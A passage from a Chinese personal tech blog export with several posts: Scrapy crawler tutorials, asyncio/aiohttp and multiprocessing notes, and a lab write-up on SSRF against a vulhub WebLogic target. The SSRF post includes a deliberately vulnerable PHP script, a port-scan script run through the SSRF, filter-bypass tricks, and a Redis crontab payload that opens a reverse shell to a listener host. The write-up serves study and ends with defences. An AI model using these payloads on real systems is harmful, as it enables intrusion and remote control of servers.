文件下，在这里写入连接操作数据库的一些功能。\n\n将连接操作 mongo 所需要的包导入进来\n\n```python\nimport pymongo\n```\n<!--more-->\n接下来定义一些参数，注意下面的函数都是在 TeamssixPipeline 类下的\n\n```python\n@classmethod\ndef from_crawler(cls, crawler):\n    cls.DB_URL = crawler.settings.get('MONGO_DB_URI')\n    cls.DB_NAME = crawler.settings.get('MONGO_DB_NAME')\n    return cls()\n\ndef open_spider(self, spider):\n    self.client = pymongo.MongoClient(self.DB_URL)\n    self.db = self.client[self.DB_NAME]\n\ndef close_spider(self, spider):\n    self.client.close()\n\ndef process_item(self, item, spider):\n    collection = self.db[spider.name]\n    collection.insert_one(dict(item))\n    return item\n```\n# 0x02 配置 settings.py\nITEM_PIPELINES 是settings.py 文件自带的，把注释符号删掉就好\n\n```python\nITEM_PIPELINES = {\n    'teamssix.pipelines.TeamssixPipeline': 300,  #优先级，1-1000，数值越低优先级越高\n}\nMONGO_DB_URI = 'mongodb://localhost:27017'  #mongodb 的连接 url\nMONGO_DB_NAME = 'blog'  #要连接的库\n```\n# 0x02 运行\n直接执行命令，不加参数\n\n```\nscrapy crawl blogurl\n```\n注意，如果原来 MongoDB 中没有我们要连接的库， MongoDB 会自己创建，就不需要自己创建了，所以还是蛮方便的，使用 Robo 3T 打开后，就能看到刚才存进的数据。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/scrapy12.png)\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n>参考链接：\n>[https://youtu.be/aDwAmj3VWH4](https://youtu.be/aDwAmj3VWH4)\n>[http://doc.scrapy.org/en/latest/topics/architecture.html](http://doc.scrapy.org/en/latest/topics/architecture.html)\n>[https://lemmo.xyz/post/Scrapy-To-MongoDB-By-Pipeline.html](https://lemmo.xyz/post/Scrapy-To-MongoDB-By-Pipeline.html)\n","tags":["Python","学习笔记","Scrapy"],"categories":["Python Scrapy 爬虫框架学习笔记"]},{"title":"【Python Scrapy 爬虫框架】 4、数据项介绍和导出文件","url":"/year/191226-151659.html","content":"# 0x00 前言\n通过上文的内容，已经把博客文章的标题及目录爬取下来了，接下来为了方便数据的保存，我们可以把这些文章的标题及目录给包装成一个数据项，也就是 items。\n\n# 0x01 配置 item\n先来到 items.py 文件下，对标题及目录的信息进行包装，为了对这些信息进行区别，还需要有一个 id，所以代码如下：\n\n```python\nclass TeamssixItem(scrapy.Item):\n    _id = scrapy.Field()\n    title = scrapy.Field()\n    list = scrapy.Field()\n```\n<!--more-->\n编辑好 items.py 文件后，来到 teamssix_blog_spider.py 先把刚才编辑的内容引用进来。\n\n```python\nfrom teamssix.items import TeamssixItem\n```\n接着创建一个 item ，并抛出 item ，这时这个 item 就会进入到 item pipelines 中处理。\n\n```python\nitem = TeamssixItem(_id = response.url,title = title,list = list)\nyield item\n```\n# 0x02 运行\n程序中包含 item 的好处就在于可以直接把运行结果输出到文件中，直接 -o 指定导出文件名，scrapy 支持导出 json 、jsonlines 、jl 、csv 、xml 、marshal 、pickle 这几种格式。\n\n```\nscrapy crawl blogurl -o result.json\n```\n另外如果发现导出文件乱码，只需要在 settings.py 文件中添加下面一行代码即可。\n\n```python\nFEED_EXPORT_ENCODING = \"gb18030\"\n```\n运行结果如下：\n\n```\n~# scrapy crawl blogurl -o result.json\n~# cat result2.json\n[\n{\"_id\": \"https://www.teamssix.com/year/191224-093319.html\", \"title\": \"【Python Scrapy 爬虫框架】 2、利用 Scrapy 爬取我的博客文章标题链接\", \"list\": [\"0x00 新建项目\", \"0x01 创建一个爬虫\", \"0x02\n 运行爬虫\", \"0x03 爬取内容解析\"]},\n{\"_id\": \"https://www.teamssix.com/year/191127-201447.html\", \"title\": \"【漏洞笔记】Robots.txt站点文件\", \"list\": [\"0x00 概述\", \"0x01 漏洞描述\", \"0x02 漏洞危害\", \"0x03 修复建议\"]},\n……省略……\n```\n可以很明显的感受到使用 scrapy 可以很方便的将数据导出到文件中，下一篇文章将介绍如何导出到 MongoDB数据库中。\n\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n>参考链接：\n>[https://youtu.be/aDwAmj3VWH4](https://youtu.be/aDwAmj3VWH4)\n>[http://doc.scrapy.org/en/latest/topics/architecture.html](http://doc.scrapy.org/en/latest/topics/architecture.html)\n","tags":["Python","学习笔记","Scrapy"],"categories":["Python Scrapy 爬虫框架学习笔记"]},{"title":"【Python Scrapy 爬虫框架】 3、利用 Scrapy 爬取博客文章详细信息","url":"/year/191226-151652.html","content":"\n# 0x00 写在前面\n在之前的文章中，会发现如果直接使用爬取命令，终端会回显很多调试信息，这样输出的内容就会显得很乱，所以就可以使用下面的命令：\n\n```\nscrapy crawl blogurl  -s LOG_FILE=all.log\n```\n<!--more-->\n也就是在原来的基础上加上一个 -s 参数，这样调试信息就会保存到参数指定的文件中，不过也可以在 class 下添加下面的代码，这样只会显示调试出现错误的信息，所以这种方式就不用加 -s 了，至于选择哪一个，就需要​视情况而定。​\n\n```\ncustom_settings = {'LOG_LEVEL':'ERROR'}\n```\n# 0x01 编写子页面爬取代码\n先来看一行关键代码\n\n```python\nyield scrapy.Request(url,callback=self.sub_article)\n```\n上面这行代码中，使用 yield 返回利用 scrapy 请求 url 所获得的数据，并将数据通过 callback 传递到 sub_article 函数中。\n\n其实对于 yield 和 return 都可以返回数据，但是利用 yield 返回数据后，还可以继续运行下面的代码，而使用 return 后，接下来的代码就不会再运行了，在 scrapy 中，如果使用 return 返回数据再用 list 存储数据，会造成不少的内存消耗，而使用 yield 则可以减少这些不必要的内存浪费。\n\n所以接下来在 sub_article 函数中写上我们爬取子页面的代码即可，这里就爬取每个文章的标题和目录作为示例了。\n\n```python\ndef sub_article(self,response):\n   soup = BeautifulSoup(response.text,'html.parser')\n   print('\\n',soup.select('.title')[0].text)\n   for i in soup.select('.toc-text'):\n      print('\\t',i.text)\n```\n运行结果如下：\n\n```\n~# scrapy crawl blogurl  -s LOG_FILE=all.log\n【漏洞笔记】Robots.txt站点文件\n         0x00 概述\n         0x01 漏洞描述\n         0x02 漏洞危害\n         0x03 修复建议\n【经验总结】常见的HTTP方法\n         0x00 概述\n         0x01 GET\n         0x02 HEAD\n         0x03 POST\n         0x04 PUT\n         0x05 DELETE\n         0x06 CONNECT\n         0x07 OPTIONS\n         0x08 TRACE\n         0x09 PATCH\n【漏洞笔记】Host头攻击\n         0x00 概述\n         0x01 漏洞描述\n         0x02 漏洞危害\n         0x03 修复建议\n【直播笔记】白帽子的成长之路\n【Python 学习笔记】 异步IO (asyncio) 协程\n         0x00 前言\n         0x01 基本用法\n……省略……\n```\n# 0x02 完整代码\n```python\nimport scrapy\nfrom bs4 import BeautifulSoup\n\nclass BlogSpider(scrapy.Spider):\n   name = 'blogurl'\n   start_urls = ['https://www.teamssix.com']\n\n   def parse(self,response):\n      soup = BeautifulSoup(response.text,'html.parser')\n      for i in soup.select('.post-title'):\n         url = 'https://www.teamssix.com{}'.format(i['href'])\n         yield scrapy.Request(url,callback=self.sub_article)\n\n   def sub_article(self,response):\n      soup = BeautifulSoup(response.text,'html.parser')\n      title = self.article_title(soup)\n      list = self.article_list(soup)\n      print(title)\n      for i in list:\n         print('\\t',i)\n\n   def article_title(self,soup):\n      return soup.select('.title')[0].text\n\n   def article_list(self,soup):\n      list = []\n      for i in soup.select('.toc-text'):\n         list.append(i.text)\n      return list\n```\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n>参考链接：\n>[https://youtu.be/aDwAmj3VWH4](https://youtu.be/aDwAmj3VWH4)\n>[https://blog.csdn.net/DEREK_D/article/details/84239813](https://blog.csdn.net/DEREK_D/article/details/84239813)\n>[http://doc.scrapy.org/en/latest/topics/architecture.html](http://doc.scrapy.org/en/latest/topics/architecture.html)\n","tags":["Python","学习笔记","Scrapy"],"categories":["Python Scrapy 爬虫框架学习笔记"]},{"title":"【Python Scrapy 爬虫框架】 2、利用 Scrapy 爬取我的博客文章标题链接","url":"/year/191224-093319.html","content":"# 0x00 新建项目\n在终端中即可直接新建项目，这里我创建一个名称为 teamssix 的项目，命令如下：\n\n```\nscrapy startproject teamssix\n```\n命令运行后，会自动在当前目录下生成许多文件，如下所示：\n\n```\nteamssix\n    │  scrapy.cfg  #scrapy的配置文件\n    └─teamssix  #项目的Python模块，在这里写自己的代码\n        │  items.py  #项目定义文件\n        │  middlewares.py  #项目中间件文件\n        │  pipelines.py  #项目管道文件，用来处理数据的写入存储等操作\n        │  settings.py  #项目设置文件\n        │  __init__.py\n        ├─spiders  #在这里写爬虫代码\n        └─ __init__.py\n```\n<!--more-->\n接下来使用 Pycharm 打开我们刚才新建的项目。\n\n# 0x01 创建一个爬虫\n首先，在 spiders 文件下 new 一个 python file，这里我新建了一个名为 teamssix_blog_spider 的 py 文件。\n\n在新建的文件中写入自己的代码，这里我写的代码如下：\n\n```Python\nimport scrapy\nclass BlogSpider(scrapy.Spider):  #创建 Spider 类\n   name = 'blogurl'，  #爬虫名称，必填\n   start_urls = ['https://www.teamssix.com']  #待爬取的 url ，必填\n   def parse(self,response):  #定义 parse 函数，以解析爬到的东西\n      print(response.url)\n      print(response.text)\n```\n# 0x02 运行爬虫\n之后运行我们刚新建的 blogurl 项目，运行命令如下：\n\n```\nscrapy crawl blogurl\n```\n之后输出结果如下：\n\n```\n2019-12-23 18:33:45 [scrapy.utils.log] INFO: Scrapy 1.8.0 started (bot: teamssix)\n2019-12-23 18:33:45 [scrapy.utils.log] INFO: Versions: lxml 4.2.5.0, libxml2 2.9.8, cssselect 1.1.0, parsel 1.5.2, w3lib 1.21.0, Twisted 19.10.0, Python 3.7e'\n……省略……\nhttps://www.teamssix.com\n<!DOCTYPE html><html lang=\"zh-CN\"><head><meta name=\"generator\" content=\"Hexo 3.8.0\"><meta charset=\"UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"><meta name=\"vi                                      \ntent><meta name=\"keywords\" content><meta name=\"author\" content=\"Teams Six,undefined\"><meta name=\"copyright\" content=\"Teams Six\"><title>【Teams Six】</title><link rel=\"styles                                      \ncss\"><link rel=\"icon\" href=\"/favicon.ico\"><!-- script(src=\"http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML\")--><script src=\"/js/mathjax/mathjax\n    tex2jax: {inlineMath: [['$', '$'], ['\\\\(', '\\\\)']]}\n});\n……省略……\n```\n不难看出，我们想要的内容已经被打印出来了，但这还远远不够，我们还需要对其进行简单的解析，这里就用到了 BeautifulSoup ，有过爬虫经验的对这个库应该是不陌生了。\n\n# 0x03 爬取内容解析\n接下来，想要获取到每个文章的链接，只需要对 parse 的内容进行修改，修改也很简单，基本之前写的多线程里的代码一致。\n\n```Python\ndef parse(self,response):\n   soup = BeautifulSoup(response.text,'html.parser')\n   for i in soup.select('.post-title'):\n      print('https://www.teamssix.com{}'.format(i['href']))\n```\n很简单的一个小爬虫，然后将爬虫运行一下\n\n```\n~# scrapy crawl blogurl  #运行命令\n2019-12-23 19:02:01 [scrapy.utils.log] INFO: Scrapy 1.8.0 started (bot: teamssix)\n……省略……\nhttps://www.teamssix.com/year/191222-192227.html\nhttps://www.teamssix.com/year/191220-161745.html\n……省略……\n2019-12-23 19:02:04 [scrapy.core.engine] INFO: Spider closed (finished)\n```\n\n此时就能够将我们想要的东西爬下来了，但这实现的功能还是比较简单，接下来将介绍如何使用 Scrapy 爬取每个子页面中的详细信息。\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n>原文链接：[https://www.temassix.com/year/191224-093319.html](https://www.temassix.com/year/191224-093319.html)\n\n>参考链接：\n>[https://youtu.be/aDwAmj3VWH4](https://youtu.be/aDwAmj3VWH4)\n>[http://doc.scrapy.org/en/latest/intro/tutorial.html](http://doc.scrapy.org/en/latest/intro/tutorial.html)","tags":["Python","学习笔记","Scrapy"],"categories":["Python Scrapy 爬虫框架学习笔记"]},{"title":"【Python Scrapy 爬虫框架】 1、简介与安装","url":"/year/191224-092208.html","content":"# 0x00 简介\n下图展示了 Scrapy 的体系结构及其组件概述，在介绍图中的流程前，先来简单了解一下图中每个组件的含义。\n\n### Engine\nEngine 负责控制系统所有组件之间的数据流，并在某些操作发生时触发事件。\n<!--more-->\n### Scheduler\nScheduler 接收来自 Engine 的请求，并对请求进行排队，以便稍后在 Engine 请求时提供这些请求。\n\n### Downloader\nDownloader 负责获取 web 页面内容并将其提供给 Engine，Engine 再将其提供给 Spiders。\n\n### Spiders\nSpiders 是由 Scrapy 用户编写的自定义类，用于解析响应并从响应中提取所需要的内容。\n\n### Item Pipelines\nItem Pipelines 负责处理由 Spiders 提取的数据。典型的任务包括清理、验证和持久性(比如把数据存储在数据库中)。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/scrapy11.png)\n\n1、Engine 从 Spiders 获取要爬行的初始请求。\n\n2、Engine 在 Scheduler 中调度请求并请求爬行下一个请求。\n\n3、Scheduler  将下一个请求返回给 Engine。\n\n4、Engine 将请求发送给 Downloader，Downloader 对待请求网站进行访问。\n\n5、Downloader 获取到响应后，将响应数据发送到 Engine。\n\n6、Engine 接收来自 Downloader 的响应并将其发送到 Spiders 进行解析处理。\n\n7、Spiders 处理响应后将解析到的数据发送给 Engine。\n\n8、Engine 将处理过的数据发送到 Item Pipelines，然后将处理过的请求发送到 Scheduler，并请求爬行可能的下一个请求，该过程重复(从步骤1开始)，直到 Scheduler 不再发出请求为止。\n\n# 0x01 安装\n在安装 Scrapy 之前，建议先安装 Anaconda ，可以省去不少麻烦，Scrapy可以直接 pip 安装，值得注意的是，如果使用 Python2 开发，就需要使用 pip2 安装，使用 Python3 开发就需要使用 pip3 安装，安装命令如下：\n\n```\npip install scrapy\n```\n如果安装比较慢，可以指定国内安装源进行安装，下面的命令使用的清华源。\n\n```\npip install scrapy -i https://pypi.tuna.tsinghua.edu.cn/simple\n```\n使用 -i 指定国内安装源后可以有效的提高下载速度。\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n>参考链接：\n>[https://youtu.be/aDwAmj3VWH4](https://youtu.be/aDwAmj3VWH4)\n>[http://doc.scrapy.org/en/latest/topics/architecture.html](http://doc.scrapy.org/en/latest/topics/architecture.html)\n","tags":["Python","学习笔记","Scrapy"],"categories":["Python Scrapy 爬虫框架学习笔记"]},{"title":"【漏洞笔记】浅谈SSRF原理及其利用","url":"/year/191222-192227.html","content":"声明：本文仅用作技术交流学习分享用途，严禁将本文中涉及到的技术用法用于违法犯罪目的。\n\n# 0x00 漏洞说明\nSSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统，既然是跳板，也就是表明攻击者是无法直接访问目标服务的，为了更好的理解这个过程，我从网上找了一张图，贴在了下面。\n<!--more-->\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF1.png)\n\n# 0x01 漏洞影响\n上面简单介绍了一下SSRF的原理，那么SSRF能干什么，产生哪些危害呢？\n\n利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等等，可以说SSRF的危害不容小觑了。\n\n# 0x02 漏洞发现\n既然SSRF有这些危害，那我们要怎么发现哪里存在SSRF，发现了又怎么利用呢？接下来就好好唠唠这点。\n\n可以这么说，能够对外发起网络请求的地方，就可能存在SSRF漏洞，下面的内容引用了先知社区的一篇文章，文章链接在底部。\n\n具体可能出现SSRF的地方：\n\n1.社交分享功能：获取超链接的标题等内容进行显示\n\n2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n\n3.在线翻译：给网址翻译对应网页的内容\n\n4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片\n\n5.图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验\n\n6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试\n\n7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作\n\n8.数据库内置功能：数据库的比如mongodb的copyDatabase函数\n\n9.邮件系统：比如接收邮件服务器地址\n\n10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等\n\n11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……\n\n12.从远程服务器请求资源（upload from url 如discuz！；import & expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）\n\n# 0x03 漏洞验证\n1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞\n\n2、在页面源码中查找访问的资源地址，如果该资源地址类型为下面这种样式则可能存在SSRF漏洞\n```\nhttp://www.xxx.com/a.php?image=(地址)\n```\n\n# 0x04 漏洞利用\n## 1、一个简单的测试靶场\n测试PHP代码：\n\n```php\n<?php\nfunction curl($url){\n\t$ch = curl_init();\n\tcurl_setopt($ch, CURLOPT_URL, $url);\n\tcurl_setopt($ch, CURLOPT_HEADER, 0);\n\tcurl_exec($ch);\n\tcurl_close($ch);\n}\n\n$url = $_GET['url'];\ncurl($url);\n?>\n```\n利用phpstudy或者宝塔搭建好靶场后，访问自己的url地址。\n```\nhttp://192.168.38.132/ssrf.php?url=teamssix.com\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF2.png)\n\n如果服务器有其他服务只能本地访问，比如phpmyadmin，则可以构造ssrf.php?url=127.0.0.1、phpmyadmin进行访问，接下来看看利用SSRF扫描目标主机端口\n\n打开Burp，抓包发到Intruder，设置Payload位置\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF3.png)\n\n将载荷类型设置为number，数字范围从1-65535，开始爆破\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF4.png)\n\n根据响应长度及响应码，可以判断出80、3389是开放着的\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF5.png)\n\n## 2、Weblogic漏洞复现\n搭建环境参考：https://blog.csdn.net/qq_36374896/article/details/84102101\n\n搭建好之后，访问 IP:7001/uddiexplorer/ 即可访问，如果搭建在本机， IP 就是127.0.0.1。\n\n### 1、漏洞存在测试\nWeblogic 的 SSRF 漏洞地址在 /uddiexplorer/SearchPublicRegistries.jsp ，开启Burp代理后，来到漏洞地址，随便在搜索框里输点东西，点击 search 按钮抓包\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF6.png)\n\n可以看到在请求包里的 operator 参数值为URL，说明此处可能存在SSRF漏洞\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF7.png)\n\n将 operator 参数值为改为其他URL，再次进行发包测试\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF8.png)\n\n把响应包翻到底部，可以很明显的看到靶机对我们修改后的URL进行了访问，接下来把URL端口修改一下，也就是让靶机请求一个不存在的地址\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF9.png)\n\n这时靶机返回信息提示连接不到服务，通过上面的两步测试可以判断出该目标是存在SSRF漏洞的。\n\n### 2、通过Redis服务反弹shell\n既然想通过Redis服务反弹Shell，就需要先知道Redis服务的内网IP，这里因为是本地环境，内网IP就直接查看了，如果公网的话就要看前期信息收集怎么样了，当然爆破IP也是可以的。\n\n进入 redis服务 的shell，查看内网IP\n\n```\n:~/vulhub/weblogic/ssrf# docker exec -it ssrf_redis_1 bash\n[root@5d9f91f455b6 /]# ifconfig\neth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02  \n          inet addr:172.18.0.2  Bcast:172.18.255.255  Mask:255.255.0.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:129 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:13176 (12.8 KiB)  TX bytes:0 (0.0 b)\n```\n知道内网IP后，就能扫描端口了，下面是我写的一个小脚本，当然用Burp也是可以的\n\n```python\nimport requests\nurl = 'http://192.168.38.134:7001/uddiexplorer/SearchPublicRegistries.jsp?'\nheaders = {'Content-Type':'application/x-www-form-urlencoded'}\nfor port in range(1,65535):\n\tdata = 'operator=http://172.18.0.2:{}&rdoSearch=name&txtSearchname=teamsix&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'.format(port)\n\tr = requests.post(url,headers=headers,data=data)\n\tif 'Tried all' not in r.text:\n\t\tprint('\\n\\n[+] {} 发现端口\\n\\n'.format(port))\n```\n执行脚本\n\n```\n~# python3 ssrf_portscan.py\n[+] 6379 发现端口\n```\n通过扫描发现Redis服务的默认端口6373是开放的。\n\n接下来使用Burp写入shell，注意下面的IP地址为自己nc监听的地址\n\n```\nhttp://172.18.0.2:6379/test\n\nset 1 \"\\n\\n\\n\\n* * * * * root bash -i >& /dev/tcp/192.168.10.30/4444 0>&1\\n\\n\\n\\n\"\nconfig set dir /etc/\nconfig set dbfilename crontab\nsave\n\naaa\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF10.png)\n\n如果使用 Burp 的话，直接把那几行代码复制到 operator 参数后面就行，就不用URL编码了。\n\n如果反弹不回 Shell ，在确定各个 IP、端口等参数都没有问题的情况下，Burp 里多点几次几次发送就可以了，我有时候都需要点个几十次才能反弹 Shell ，感觉有些情况下反弹 Shell 是个比较玄学的东西。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF11.png)\n\n# 0x05 绕过技巧\n1、添加端口号：http://127.0.0.1:8080\n\n2、短网址绕过：http://dwz.cn/11SMa\n\n3、IP限制绕过：十进制转换、八进制转换、十六进制转换、不同进制组合转换\n\n4、协议限制绕过：当url协议限制只为http(s)时,可以利用follow redirect特性,构造302跳转服务,结合dict://,file://,gopher://\n\n5、可以指向任意ip的域名：xip.io\n\n6、@    http://abc@127.0.0.1\n\n# 0x06 SSRF防御\n1、过滤返回信息,验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。\n\n2、统一错误信息,避免用户可以根据错误信息来判断远程服务器的端口状态。\n\n3、限制请求的端口为http常用的端口,比如80,443,8080,8090\n\n4、黑名单内网ip。避免应用被用来获取内网数据,攻击内网\n\n5、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题\n\n\n>更多信息欢迎关注我的微信公众号：TeamsSix\n\n>参考文章\n>https://xz.aliyun.com/t/2115\n>http://www.liuwx.cn/penetrationtest-3.html\n>https://www.cnblogs.com/yuzly/p/10903398.html\n>https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf\n>https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/\n","tags":["学习笔记","漏洞笔记","SSRF"],"categories":["学习笔记"]},{"title":"【Python 学习笔记】 异步IO (asyncio) 协程","url":"/year/191220-161745.html","content":"# 0x00 前言\n\n之前对协程早有耳闻，但一直没有去学习，今天就来学习一下协程，再次感谢莫烦的教程。\n\n可以交给asyncio执行的任务被称为协程， asyncio 即异步的意思，在 Python3 中这是一个仅使用单线程就能达到多线程、多进程效果的工具。\n\n在单线程中使用异步发起 IO 操作的时候，不需要等待 IO 的结束，在等待 IO 操作结束的这个空当儿可以继续做其他事情，结束的时候就会得到通知，所以能够很有效的利用等待下载的这段时间。\n\n今天就来看看协程能不能干掉多线程和多进程。\n<!--more-->\n# 0x01 基本用法\n\nPython 的在 3.4 中引入了协程的概念，3.5 则确定了协程的语法，所以想使用协程处理 IO ，需要Python3.5 及以上的版本，下面是一个简单示例代码。\n```Python\n    import time\n    import asyncio\n    \n    async def job(t):\n        print('开始第', t,'个任务')\n        await asyncio.sleep(t)  #等待t秒\n        print('第', t, '个任务执行了', t, '秒')\n        \n    \n    async def main(loop):\n        tasks = [loop.create_task(job(t)) for t in range(1, 4)]     #创建多个任务\n        await asyncio.wait(tasks)    #运行刚才创建的那些任务\n    \n    if __name__ == '__main__':\n        start_time = time.time()\n        loop = asyncio.get_event_loop()    #创建事件循环\n        loop.run_until_complete(main(loop))    #运行刚才创建的事件循环\n        loop.close()\n        print(\"所有总共耗时\", time.time() - start_time)\n```\n运行结果如下：\n```\n    开始第 1 个任务\n    开始第 2 个任务\n    开始第 3 个任务\n    第 1 个任务执行了 1 秒\n    第 2 个任务执行了 2 秒\n    第 3 个任务执行了 3 秒\n    所有总共耗时 3.0029773712158203\n```\n这里运行了三个任务，三个任务的执行时间加在一起是6秒，但是最后总共耗时是3秒，接下来就看看协程在爬虫中的使用。\n\n# 0x02 aiohttp的使用\n\n使用 aiohttp 模块可以将 requests 替换成一个异步的 requests ，下面先来看看一般的 requests 的使用，下面的运行结果耗时是我运行了三次，然后取平均数的结果。\n```Python\n    import time\n    import requests\n    \n    def normal():\n        for i in range(3):\n            r = requests.get(URL)\n    \n    if __name__ == '__main__':\n    \t\tt1 = time.time()\n    \t\tURL = 'https://www.teamssix.com/'\n        normal()\n        print(\"正常访问 3 次博客耗费时间\", time.time()-t1)\n```\n运行结果如下：\n\n    正常访问 3 次博客耗费时间 12.872265259424845\n\n正常情况下，花费了近 13 秒，接下来使用 aiohttp 看看耗时多少。\n```Python\n    import time\n    import asyncio\n    import aiohttp\n    \n    async def job(session):\n       response = await session.get('https://www.teamssix.com/')       # 等待并切换\n       return str(response.url)\n    \n    async def main(loop):\n       async with aiohttp.ClientSession() as session:      # 官网推荐建立 Session 的形式\n           tasks = [loop.create_task(job(session)) for _ in range(3)]\n           finished, unfinished = await asyncio.wait(tasks)\n    if __name__ == '__main__':\n    \tt1 = time.time()\n    \tloop = asyncio.get_event_loop()\n    \tloop.run_until_complete(main(loop))\n    \tloop.close()\n    \tprint(\"异步访问 3 次博客耗费时间\", time.time() - t1)\n```\n运行结果如下：\n```\n    异步访问 3 次博客耗费时间 4.055158615112305\n```\n从运行结果上来看使用 aiohttp 还是很给力的，接下来，看看多线程运行的时间。\n```Python\n    import time\n    import threading\n    import requests\n    \n    def thread_test():\n        r = requests.get(URL)\n    \n    if __name__ == '__main__':\n        t1 = time.time()\n        URL = 'https://www.teamssix.com/'\n        thread_list = []\n        for i in range(3):\n            t = threading.Thread(target=thread_test)\n            thread_list.append(t)\n        for i in thread_list:\n            i.start()\n        for i in thread_list:\n            i.join()\n        print(\"多线程访问 3 次博客耗费时间\", time.time()-t1)\n```\n运行结果如下：\n```\n    5.449431339899699\n```\n可以看到 aiohttp 的速度还是要略快于多线程的，这里只是简单介绍了一下 aiohttp ，详细的可以参阅[官方文档](https://docs.python.org/zh-cn/3/library/asyncio.html)，想要使用的熟练还是需要大量练习，任重道远。\n\n> 更多信息欢迎关注我的个人微信公众号：TeamsSix\n> 参考文章：\n> https://www.jianshu.com/p/b5e347b3a17c\n> https://segmentfault.com/a/1190000008814676\n> https://www.lylinux.net/article/2019/6/9/57.html\n> https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-02-asyncio/","tags":["Python","协程","异步IO"],"categories":["Python 其他相关笔记"]},{"title":"【Python 学习笔记】多进程爬虫","url":"/year/191220-161533.html","content":"# 0x00 前言\n\n前段时间学习了多线程，但在实际的情况中对于多线程的速度实在不满意，所以今天就来学学多进程分布式爬虫，在这里感谢莫烦的Python教程。\n\n# 0x01 什么是多进程爬虫\n\n在讲述多进程之前，先来回顾一下之前学习的多线程。\n<!--more-->\n对于多线程可以简单的理解成运输快递的货车，虽然在整个运输快递的途中有很多货车参与运输，但快递到你手中的时间并不会因为货车的数量增加而变化多少，甚至可能会因为参与运输的货车数量过多，导致送货时间变慢，因为货物在不断的上货卸货。\n当然现实中可不会有人这么干，然而在计算机的世界里，有时却会犯这种错误，这也就是说多线程并不是越多越好。\n\n如果有操作系统的基础，则对于线程与进程的理解会更深刻些，这里继续参照上面的例子，对于线程可以简单的理解成一个线程就是一个货车，而一个进程则是一整条快递运输线路上的货车集合，也就是说一个进程包含了多个线程。\n\n如果在只有一个快递需要运输的时候，使用线程与进程的区别或许不大，但是如果有十件快递、百件快递，使用多进程无疑能够极大的提高效率。\n\n# 0x02 准备工作\n\n在开始学习多进程之前，先来理一下爬虫思路，这里拿爬取我的博客文章举例，首先先用 requests 访问 temassix.com，之后利用 BeautifulSoup 解析出我博客中的文章链接，接着再利用 requests 访问文章，便完成了一个简单的爬虫。\n\n接下来需要用到的模块：\n```Python\n    import time    #测试爬取时间\n    import requests\n    import threading\n    from multiprocessing import Process   #多进程模块\n    from bs4 import BeautifulSoup\n```\n接下来需要用到的一些子函数：\n```Python\n    def req_url(url):\n        r = requests.get(url)    #访问url\n        return(r.text)    #返回html\n    \n    def soup_url(html):\n    \turl_list = []\n    \tsoup = BeautifulSoup(html, 'html.parser')    #解析返回的html\n    \tfor i in soup.select('.post-title'):\n    \t\turl_list.append('https://www.teamssix.com{}'.format(i['href']))    #拼接博客文章的url\n    \treturn (url_list)    #返回博客文章url数组\n```\n# 0x03 测试普通爬取方法\n\n这里先使用普通爬取的方法，也就是单线程测试一下，为了方便，下面提到的单线程处理方法，准确的来说是单进程单线程，同样的，下面提到的多进程准确的说法是多进程单线程，多线程准确的说则是单进程多线程。\n\n值得注意的是爬取耗时根据自己的网络情况而定，即使碰到多进程耗时几百秒而单线程耗时几十秒也是正常的，这种情况是因为网络环境较差造成的，所以碰到结果出入很大的时候，可以多试几次，排除偶然性，下面就来上代码。\n```Python\n    if __name__ == '__main__':\n    \t# 开始单线程\n    \tstart_time = time.time()\n  